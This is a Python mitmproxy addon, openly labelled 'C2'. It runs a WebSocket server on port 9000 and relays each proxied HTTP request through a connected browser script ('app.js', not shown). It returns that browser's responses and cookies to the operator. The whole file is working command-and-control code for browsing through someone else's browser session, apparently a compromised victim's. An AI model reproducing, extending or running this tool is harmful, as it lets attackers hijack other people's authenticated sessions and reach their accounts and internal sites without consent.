from mitmproxy import ctx, http

import asyncio
import json
import threading
import time

import websockets
from websockets import ConnectionClosed

WS_BIND_ADDRESS = '0.0.0.0'
WS_PORT = 9000

WS_TIMEOUT = 5.0

# Payloads are: [ascii json object] + [0x00 terminator] + [body]
# Request object includes method, url, and headers. Response object includes
# code, headers, and cookies.

def build_req_payload(req_details, body):
    """
    Builds request payload from req_details object and body.
    """
    req_details = json.dumps(req_details, separators=(',', ':'))
    payload = b''
    payload += req_details.encode('ascii')
    payload += b'\x00'
    payload += body
    return payload

class PayloadError(Exception):
    pass

def process_res_payload(res_payload):
    """
    Processes response payload. Returns response details object and body.
    """
    res_details = ''
    i = 0
    try:
        while True:
            byte = res_payload[i]
            if byte == 0:
                break
            res_details += chr(byte)
            i += 1
    except IndexError:
        raise PayloadError
    res_body = res_payload[i+1:]
    try:
        res_details = json.loads(res_details)
    except ValueError:
        raise PayloadError
    return res_details, res_body

def make_err(reason):
    ctx.log.error(reason)
    reason += '\n'
    return http.HTTPResponse.make(400, reason, {'content-type': 'text/plain'})

class C2:
    def __init__(self):
        """
        Start a WebSocket server on a new thread.
        """
        # used for communicating with websocket server thread
        self.ws_connected = False
        self.ws_input = None
        self.ws_output = None

        def start_ws_server():
            async def on_connect(ws: websockets.WebSocketServerProtocol, _):
                if self.ws_connected:
                    return
                self.ws_connected = True
                ctx.log.info('c2: websocket connected!')
                while True:
                    # continually scan for input from main thread
                    if self.ws_input:
                        # clear old response message if received after timeout
                        ws.messages.clear()
                        # send input from main thread directly through websocket
                        await ws.send(self.ws_input) # does not raise
                        self.ws_input = None
                        try:
                            # send response back to main thread
                            self.ws_output = await asyncio.wait_for(ws.recv(),
                                                                    WS_TIMEOUT)
                        except (ConnectionClosed, asyncio.TimeoutError) as e:
                            if isinstance(e, ConnectionClosed):
                                ctx.log.error('c2: websocket disconnected')
                                self.ws_connected = False
                                self.ws_output = 'ERR_DISCONNECTED'
                                return
                            else:
                                ctx.log.error('c2: websocket timed out')
                                self.ws_output = 'ERR_TIMED_OUT'
                    await asyncio.sleep(0.1)

            asyncio.set_event_loop(asyncio.new_event_loop())
            start_server = websockets.serve(on_connect, WS_BIND_ADDRESS,
                                            WS_PORT)
            asyncio.get_event_loop().run_until_complete(start_server)
            asyncio.get_event_loop().run_forever()

        thread = threading.Thread(target=start_ws_server, args=[], daemon=True)
        thread.start()
        ctx.log.info(f'c2: started websocket server on {WS_BIND_ADDRESS} port '
                     f'{WS_PORT}')

    def request(self, flow: http.HTTPFlow):
        req_details = {}
        req_details['method'] = flow.request.method
        req_details['url'] = flow.request.url
        headers_dict = {}
        try:
            flow.request.headers.pop('proxy-connection')
        except KeyError:
            pass
        try:
            flow.request.headers.pop('content-encoding')
            ctx.log.warn('c2: stripping content encoding from request')
        except KeyError:
            pass
        try:
            flow.request.headers.pop('content-length')
        except KeyError:
            pass
        for header in flow.request.headers:
            headers_dict[header] = flow.request.headers[header]
        req_details['headers'] = headers_dict

        ctx.log.info('c2: building request payload...')
        try:
            flow.request.content.decode('ascii')
        except UnicodeError:
            flow.response = make_err('c2: request body must be text, see '
                                     'comment at top of app.js')
            return
        req_payload = build_req_payload(req_details, flow.request.content)

        if not self.ws_connected:
            flow.response = make_err('c2: websocket not yet connected')
            return

        # send to websocket server thread
        ctx.log.info('c2: sending through websocket...')
        self.ws_input = req_payload

        # wait for response from thread
        while not self.ws_output:
            time.sleep(0.1)

        # thread may have returned an error
        if self.ws_output == 'ERR_DISCONNECTED':
            self.ws_output = None
            flow.response = make_err('c2: websocket disconnected')
            return
        if self.ws_output == 'ERR_TIMED_OUT':
            self.ws_output = None
            flow.response = make_err('c2: timed out while waiting for response')
            return
        # otherwise, thread returned bytes from app.js
        ctx.log.info('c2: processing response payload...')
        try:
            res_details, res_body = process_res_payload(self.ws_output)
        except PayloadError:
            flow.response = make_err('c2: received invalid response')
            return
        finally:
            self.ws_output = None

        # automatically calculates and adds content-length header
        flow.response = http.HTTPResponse.make(
            res_details['code'],
            res_body,
            res_details['headers']
        )
        cookie_dict = res_details['cookies']
        cookie_headers = []
        for cookie in cookie_dict:
            cookie_headers.append(f'{cookie}={cookie_dict[cookie]}')
        flow.response.headers.set_all('set-cookie', cookie_headers)

addons = [
    C2()
]